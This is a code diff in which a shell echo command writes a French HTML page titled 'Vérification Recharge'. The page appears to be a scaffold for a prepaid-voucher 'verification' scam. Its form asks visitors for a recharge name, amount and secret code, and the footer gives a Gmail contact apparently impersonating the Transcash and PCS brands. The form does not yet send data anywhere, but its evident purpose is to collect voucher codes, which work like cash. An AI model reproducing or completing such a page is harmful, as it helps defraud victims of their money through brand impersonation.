@@ -1,0 +1,58 @@
+echo "<!DOCTYPE html>
+<html lang=\"fr\">
+<head>
+    <meta charset=\"UTF-8\">
+    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
+    <title>Vérification Recharge</title>
+    <link rel=\"stylesheet\" href=\"styles.css\">
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href=\"index.html\">Accueil</a></li>
+                <li><a href=\"verification.html\">Vérification</a></li>
+                <li><a href=\"#contact\">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <h1>Vérifie ton recharge</h1>
+        <form action=\"#\">
+            <label for=\"nom_recharge\">Nom du recharge*</label>
+            <input type=\"text\" id=\"nom_recharge\" name=\"nom_recharge\" required>
+
+            <label for=\"montant\">Montant*</label>
+            <input type=\"number\" id=\"montant\" name=\"montant\" required>
+
+            <label for=\"code_recharge\">Code du recharge*</label>
+            <input type=\"text\" id=\"code_recharge\" name=\"code_recharge\" required>
+
+            <label for=\"cacher_code\">Cacher votre code:</label>
+            <input type=\"radio\" id=\"oui\" name=\"cacher_code\" value=\"oui\">
+            <label for=\"oui\">Oui</label>
+            <input type=\"radio\" id=\"non\" name=\"cacher_code\" value=\"non\">
+            <label for=\"non\">Non</label>
+
+            <label for=\"email\">Email</label>
+            <input type=\"email\" id=\"email\" name=\"email\">
+
+            <p>Notre Politique de confidentialité s'applique.</p>
+
+            <button type=\"submit\">Vérifiez</button>
+        </form>
+    </main>
+    <footer>
+        <p>Horaires D'OUVERTURE</p>
+        <p>Lu-Ve 07j/24H</p>
+        <p>Sa-Di 8h/13H</p>
+
+        <p>NOUS TROUVER</p>
+        <p>123 Rue du test</p>
+        <p>Paris, 75001</p>
+        <p>ladirectiontranscashpcs@gmail.com</p>
+
+        <p>NOUS SUIVRE</p>
+    </footer>
+</body>
+</html>" > index.html
